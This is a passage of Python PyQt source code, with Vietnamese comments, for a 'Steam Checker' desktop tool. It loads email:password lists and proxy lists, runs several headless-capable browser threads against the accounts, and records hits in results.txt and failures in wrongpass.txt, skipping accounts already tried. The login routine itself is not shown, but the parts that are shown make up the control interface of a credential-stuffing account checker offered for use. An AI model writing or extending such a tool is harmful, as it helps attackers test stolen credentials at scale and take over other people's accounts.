        separator1 = QFrame()
        separator1.setFrameShape(QFrame.HLine)
        separator1.setStyleSheet("color: #4a90e2;")
        file_layout.addWidget(separator1)
        
        # Proxies file
        proxies_layout = QVBoxLayout()
        proxies_layout.setSpacing(5)
        
        proxies_label_layout = QHBoxLayout()
        self.proxies_label = QLabel("🌐 No proxies loaded")
        self.proxies_label.setStyleSheet("font-weight: bold; color: #4a90e2;")
        proxies_label_layout.addWidget(self.proxies_label)
        proxies_label_layout.addStretch()
        proxies_layout.addLayout(proxies_label_layout)
        
        self.add_proxies_btn = QPushButton("📂 Add Proxies")
        self.add_proxies_btn.clicked.connect(self.load_proxies)
        proxies_layout.addWidget(self.add_proxies_btn)
        
        file_layout.addLayout(proxies_layout)
        
        left_layout.addWidget(file_group)
        
        # Settings group
        settings_group = QGroupBox("⚙️ Settings")
        settings_layout = QVBoxLayout(settings_group)
        settings_layout.setSpacing(8)
        
        # Use proxy checkbox
        self.use_proxy_cb = QCheckBox("🌐 Use Proxy")
        self.use_proxy_cb.setStyleSheet("font-weight: bold;")
        settings_layout.addWidget(self.use_proxy_cb)
        
        # Headless mode
        headless_layout = QHBoxLayout()
        headless_layout.setSpacing(10)
        headless_label = QLabel("🖥️ Browser Mode:")
        headless_label.setStyleSheet("font-weight: bold;")
        headless_layout.addWidget(headless_label)
        self.headless_combo = QComboBox()
        self.headless_combo.addItems(["👁️ Non-headless", "👻 Headless"])
        headless_layout.addWidget(self.headless_combo)
        headless_layout.addStretch()
        settings_layout.addLayout(headless_layout)
        
        # Threads input
        threads_layout = QHBoxLayout()
        threads_layout.setSpacing(10)
        threads_label = QLabel("🧵 Threads:")
        threads_label.setStyleSheet("font-weight: bold;")
        threads_layout.addWidget(threads_label)
        self.threads_input = QLineEdit("5")
        self.threads_input.setMaximumWidth(80)
        self.threads_input.setStyleSheet("text-align: center; font-weight: bold;")
        threads_layout.addWidget(self.threads_input)
        threads_layout.addStretch()
        settings_layout.addLayout(threads_layout)
        
        left_layout.addWidget(settings_group)
        
        # Control buttons
        control_group = QGroupBox("🎮 Control")
        control_layout = QVBoxLayout(control_group)
        control_layout.setSpacing(10)
        
        # Start/Stop buttons
        button_layout = QHBoxLayout()
        button_layout.setSpacing(10)
        
        self.start_btn = QPushButton("🚀 Start Checking")
        self.start_btn.clicked.connect(self.start_checking)
        self.start_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #28a745, stop:1 #20c997);
                font-size: 14px;
                padding: 12px 20px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #34ce57, stop:1 #28a745);
            }
        """)
        
        self.stop_btn = QPushButton("⏹️ Stop")
        self.stop_btn.clicked.connect(self.stop_checking)
        self.stop_btn.setEnabled(False)
        self.stop_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #dc3545, stop:1 #c82333);
                font-size: 14px;
                padding: 12px 20px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #e74c3c, stop:1 #dc3545);
            }
        """)
        
        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        control_layout.addLayout(button_layout)
        
        # Progress bar
        progress_layout = QVBoxLayout()
        progress_layout.setSpacing(5)
        
        progress_label = QLabel("📊 Progress:")
        progress_label.setStyleSheet("font-weight: bold; color: #4a90e2;")
        progress_layout.addWidget(progress_label)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                height: 25px;
                font-size: 12px;
                font-weight: bold;
            }
        """)
        progress_layout.addWidget(self.progress_bar)
        
        control_layout.addLayout(progress_layout)
        left_layout.addWidget(control_group)
        
        # Log area
        log_group = QGroupBox("📝 Live Log")
        log_layout = QVBoxLayout(log_group)
        log_layout.setSpacing(5)
        
        # Log controls
        log_controls_layout = QHBoxLayout()
        log_controls_layout.setSpacing(10)
        
        clear_log_btn = QPushButton("🗑️ Clear Log")
        clear_log_btn.clicked.connect(self.clear_log)
        clear_log_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #6c757d, stop:1 #5a6268);
                font-size: 11px;
                padding: 6px 12px;
            }
        """)
        
        log_controls_layout.addWidget(clear_log_btn)
        log_controls_layout.addStretch()
        
        log_layout.addLayout(log_controls_layout)
        
        # Log text area
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        self.log_text.setStyleSheet("""
            QTextEdit {
                background: rgba(0, 0, 0, 0.8);
                border: 2px solid #4a90e2;
                border-radius: 8px;
                color: white;
                font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
                font-size: 11px;
                padding: 10px;
                line-height: 1.4;
            }
        """)
        log_layout.addWidget(self.log_text)
        
        right_layout.addWidget(log_group)
    
    def setup_profiles_folder(self):
        """Setup thư mục profiles"""
        if os.path.exists("profiles"):
            # Xóa toàn bộ nội dung
            for item in os.listdir("profiles"):
                item_path = os.path.join("profiles", item)
                if os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                else:
                    os.remove(item_path)
        else:
            os.makedirs("profiles", exist_ok=True)
    
    def load_accounts(self):
        """Load danh sách accounts từ file"""
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Accounts File", "", "Text Files (*.txt)")
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                
                self.accounts = []
                skipped_count = 0
                
                for line in lines:
                    line = line.strip()
                    if line and ('|' in line or ':' in line):
                        # Parse account
                        if '|' in line:
                            email, password = line.split('|', 1)
                        elif ':' in line:
                            email, password = line.split(':', 1)
                        else:
                            continue
                        
                        # Check if already processed
                        if self.is_account_already_processed(email, password):
                            skipped_count += 1
                            continue
                        
                        self.accounts.append(line)
                
                self.accounts_label.setText(f"📋 Loaded {len(self.accounts)} accounts (Skipped {skipped_count} already checked)")
                self.log_with_type(f"Loaded {len(self.accounts)} accounts from {file_path} (Skipped {skipped_count} already checked)", "success")
                
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load accounts: {str(e)}")
    
    def reload_accounts(self):
        """Reload accounts và skip những account đã check"""
        if not self.accounts:
            QMessageBox.warning(self, "Warning", "No accounts loaded! Please load accounts first.")
            return
        
        try:
            # Reload từ danh sách hiện tại
            original_accounts = self.accounts.copy()
            self.accounts = []
            skipped_count = 0
            
            for line in original_accounts:
                # Parse account
                if '|' in line:
                    email, password = line.split('|', 1)
                elif ':' in line:
                    email, password = line.split(':', 1)
                else:
                    continue
                
                # Check if already processed
                if self.is_account_already_processed(email, password):
                    skipped_count += 1
                    continue
                
                self.accounts.append(line)
            
            self.accounts_label.setText(f"📋 Reloaded {len(self.accounts)} accounts (Skipped {skipped_count} already checked)")
            self.log_with_type(f"Reloaded {len(self.accounts)} accounts (Skipped {skipped_count} already checked)", "success")
            
            if skipped_count > 0:
                QMessageBox.information(self, "Reload Complete", f"Reloaded {len(self.accounts)} accounts\nSkipped {skipped_count} already checked accounts")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to reload accounts: {str(e)}")
    
    def is_account_already_processed(self, email, password):
        """Kiểm tra xem account đã được xử lý chưa (trong results.txt hoặc wrongpass.txt)"""
        try:
            # Check results.txt
            if os.path.exists("results.txt"):
                with open("results.txt", "r", encoding="utf-8") as f:
                    content = f.read()
                    if f"{email}|{password}" in content:
                        return True
            
            # Check wrongpass.txt
            if os.path.exists("wrongpass.txt"):
                with open("wrongpass.txt", "r", encoding="utf-8") as f:
                    content = f.read()
                    if f"{email}|{password}" in content:
                        return True
                        
            return False
        except:
            return False
    
    def load_proxies(self):
        """Load danh sách proxies từ file"""
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Proxies File", "", "Text Files (*.txt)")
        if file_path:
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                
                self.proxy_list = []
                for line in lines:
                    line = line.strip()
                    if line:
                        self.proxy_list.append(line)
                
                self.proxies_label.setText(f"🌐 Loaded {len(self.proxy_list)} proxies")
                self.log_with_type(f"Loaded {len(self.proxy_list)} proxies from {file_path}", "success")
                
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load proxies: {str(e)}")
    
    def start_checking(self):
        """Bắt đầu check accounts"""
        if not self.accounts:
            QMessageBox.warning(self, "Warning", "Please load accounts first!")
            return
        
        if self.is_running:
            return
        
        # Setup
        self.is_running = True
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.progress_bar.setVisible(True)
        self.progress_bar.setValue(0)
        self.current_progress = 0
        
        # Tạo queue cho accounts
        self.account_queue = queue.Queue()
        for account in self.accounts:
            self.account_queue.put(account)
        
        self.total_accounts = len(self.accounts)
        self.checked_accounts = 0
        
        # Tạo và start threads
        num_threads = int(self.threads_input.text())
        self.threads = []
        
        for i in range(num_threads):
            thread = SteamCheckerThread(
                self.account_queue,
                self.proxy_list,
                self.use_proxy_cb.isChecked(),
                self.headless_combo.currentText() == "👻 Headless",
                i + 1
            )
            thread.log_signal.connect(self.log_with_type)
            thread.finished_signal.connect(self.on_thread_finished)
            thread.account_progress_signal.connect(self.on_account_progress)
            self.threads.append(thread)
            thread.start()
        
        self.log_with_type(f"Started {num_threads} threads", "success")
        self.log_with_type(f"Total accounts to check: {self.total_accounts}", "info")
        
        # Start monitoring profiles
        self.start_profile_monitoring()
        
        # Start progress animation timer
        self.start_progress_animation()
    
    def stop_checking(self):
        """Dừng check accounts"""
        if not self.is_running:
            return
        
        self.log_with_type("Stopping all threads...", "warning")
        
        # Set stop flag for all threads
        for thread in self.threads:
            thread.should_stop = True
        
        # Kill all Chrome processes immediately by PID
        try:
            killed_count = 0
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'chrome' in proc.info['name'].lower():
                        cmdline = ' '.join(proc.info['cmdline']) if proc.info['cmdline'] else ''
                        if 'profiles' in cmdline or 'user-data-dir' in cmdline or 'playwright' in cmdline:
                            # self.log(f"Killing Chrome process with profile PID: {proc.info['pid']}", "debug")  # Debug log - không cần thiết
                            proc.kill()
                            killed_count += 1
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            self.log_with_type(f"Killed {killed_count} Chrome processes", "info")
        except Exception as e:
            self.log_with_type(f"Error killing processes: {str(e)}", "error")
        
        # Force cleanup profiles folder immediately
        self.cleanup_profiles()
        
        # Force stop all threads immediately
        for thread in self.threads:
            if thread.isRunning():
                # Set stop flag
                thread.should_stop = True
                # Force cleanup
                thread.cleanup()
                # Terminate thread
                thread.terminate()
        
        # Wait briefly for threads to finish
        for thread in self.threads:
            if thread.isRunning():
                thread.wait(500)  # Wait max 0.5 second per thread
        
        # Clear threads list
        self.threads.clear()
        
        # Stop profile monitoring
        self.stop_profile_monitoring()
        
        # Stop progress animation
        self.stop_progress_animation()
        
        # Reset UI
        self.is_running = False
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_bar.setVisible(False)
        
        self.log_with_type("All threads stopped and processes killed", "success")
    
    def on_account_progress(self, progress):
        """Callback khi có progress từ account"""
        # Cập nhật progress ngay lập tức cho các bước quan trọng
        if progress == 100:  # Account hoàn thành
            # Cập nhật progress dựa trên số account đã check
            new_progress = int((self.checked_accounts / self.total_accounts) * 100)
            self.progress_bar.setValue(new_progress)
        else:
            # Cập nhật target progress để animation timer có thể sử dụng
            base_progress = int((self.checked_accounts / self.total_accounts) * 100)
            current_account_progress = int((progress / 100) * (100 / self.total_accounts))
            target_progress = min(base_progress + current_account_progress, 100)
            
            # Cập nhật target progress (sẽ được sử dụng bởi animation timer)
            if target_progress > self.current_progress:
                self.current_progress = target_progress
    
    def on_thread_finished(self):
        """Callback khi thread hoàn thành"""
        self.checked_accounts += 1
        
        # Cập nhật progress bar ngay lập tức
        new_progress = int((self.checked_accounts / self.total_accounts) * 100)
        self.progress_bar.setValue(new_progress)
        
        # Kiểm tra xem tất cả threads đã hoàn thành chưa
        all_finished = all(not thread.isRunning() for thread in self.threads)
        if all_finished:
            # Đảm bảo progress bar đạt 100% khi hoàn thành
            self.progress_bar.setValue(100)
            self.log_with_type(f"All accounts checked! Completed: {self.checked_accounts}/{self.total_accounts}", "success")
            self.stop_checking()
    
    def cleanup_profiles(self):
        """Cleanup thư mục profiles"""
        try:
            if os.path.exists("profiles"):
                # Force remove all files and folders
                for root, dirs, files in os.walk("profiles", topdown=False):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            os.chmod(file_path, 0o777)  # Make writable
                            os.remove(file_path)
                        except:
                            pass
                    for dir in dirs:
                        try:
                            dir_path = os.path.join(root, dir)
                            os.chmod(dir_path, 0o777)  # Make writable
                            os.rmdir(dir_path)
                        except:
                            pass
                
                # Remove the profiles directory itself
                try:
                    os.rmdir("profiles")
                except:
                    pass
                
                # Recreate empty profiles directory
                os.makedirs("profiles", exist_ok=True)
                self.log_with_type("Profiles folder cleaned and recreated", "info")
        except Exception as e:
            self.log_with_type(f"Error cleaning profiles: {str(e)}", "warning")
            # Try to recreate anyway
            try:
                os.makedirs("profiles", exist_ok=True)
            except:
                pass
    
    def log_with_type(self, message, log_type="info"):
        """Thêm log message với màu sắc theo loại"""
        timestamp = time.strftime("%H:%M:%S")
        
        # Tạo format cho từng loại log
        if log_type == "success":
            color = QColor(76, 175, 80)  # Xanh lá đẹp hơn
            prefix = "✅"
            bg_color = QColor(76, 175, 80, 20)  # Background nhẹ
        elif log_type == "error":
            color = QColor(244, 67, 54)  # Đỏ đẹp hơn
            prefix = "❌"
            bg_color = QColor(244, 67, 54, 20)  # Background nhẹ
        elif log_type == "warning":
            color = QColor(255, 152, 0)  # Cam đẹp hơn
            prefix = "⚠️"
            bg_color = QColor(255, 152, 0, 20)  # Background nhẹ
        elif log_type == "info":
            color = QColor(33, 150, 243)  # Xanh dương đẹp hơn
            prefix = "ℹ️"
            bg_color = QColor(33, 150, 243, 20)  # Background nhẹ
        else:  # debug
            color = QColor(158, 158, 158)  # Xám đẹp hơn
            prefix = "🔧"
            bg_color = QColor(158, 158, 158, 10)  # Background nhẹ
        
        # Tạo text với prefix và format đẹp
        full_message = f"[{timestamp}] {prefix} {message}"
        
        # Thêm text với màu sắc và background
        cursor = self.log_text.textCursor()
        cursor.movePosition(cursor.End)
        
        # Set format cho text
        format = QTextCharFormat()
        format.setForeground(color)
        format.setBackground(bg_color)
        format.setFontWeight(500)  # Medium weight
        cursor.setCharFormat(format)
        cursor.insertText(full_message + "\n")
        
        # Auto scroll to bottom
        cursor.movePosition(cursor.End)
        self.log_text.setTextCursor(cursor)
        
        # Giới hạn số dòng log để tránh lag
        if self.log_text.document().blockCount() > 1000:
            cursor = self.log_text.textCursor()
            cursor.movePosition(cursor.Start)
            cursor.movePosition(cursor.Down, cursor.KeepAnchor, 100)
            cursor.removeSelectedText()
    
    def log(self, message):
        """Thêm log message (backward compatibility)"""
        self.log_with_type(message, "info")
    
    def clear_log(self):
        """Xóa tất cả log"""
        self.log_text.clear()
        self.log_with_type("Log cleared", "info")
    
    def get_active_profiles_count(self):
        """Đếm số lượng profiles đang hoạt động"""
        try:
            if os.path.exists("profiles"):
                profiles = [d for d in os.listdir("profiles") if os.path.isdir(os.path.join("profiles", d))]
                return len(profiles)
            return 0
        except:
            return 0
    
    def start_profile_monitoring(self):
        """Bắt đầu monitoring profiles"""
        self.profile_timer = QTimer()
        self.profile_timer.timeout.connect(self.monitor_profiles)
        self.profile_timer.start(5000)  # Check every 5 seconds
    
    def monitor_profiles(self):
        """Monitor số lượng profiles"""
        if not self.is_running:
            self.profile_timer.stop()
            return
        
        profile_count = self.get_active_profiles_count()
        if profile_count > 0:
            # self.log_with_type(f"Active profiles: {profile_count}", "debug")  # Debug log - không cần thiết
            pass
    
    def stop_profile_monitoring(self):
        """Dừng monitoring profiles"""
        if hasattr(self, 'profile_timer'):
            self.profile_timer.stop()
    
    def start_progress_animation(self):
        """Bắt đầu animation cho progress bar"""
        self.progress_timer = QTimer()
        self.progress_timer.timeout.connect(self.animate_progress)
        self.progress_timer.start(100)  # Cập nhật mỗi 100ms
    
    def animate_progress(self):
        """Animation cho progress bar"""
        if not self.is_running:
            self.progress_timer.stop()
            return
        
        # Lấy progress hiện tại của progress bar
        current_bar_value = self.progress_bar.value()
        
        # Tăng progress từ từ nếu chưa đạt target
        if current_bar_value < self.current_progress:
            # Tăng 1% mỗi lần để có animation mượt mà
            new_value = min(current_bar_value + 1, self.current_progress)
            self.progress_bar.setValue(new_value)
    
    def stop_progress_animation(self):
        """Dừng animation cho progress bar"""
        if hasattr(self, 'progress_timer'):
            self.progress_timer.stop()
    
    def closeEvent(self, event):
        """Xử lý khi đóng ứng dụng"""
        if self.is_running:
            self.stop_checking()
        event.accept()


def main():
    app = QApplication(sys.argv)
    window = SteamCheckerMainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
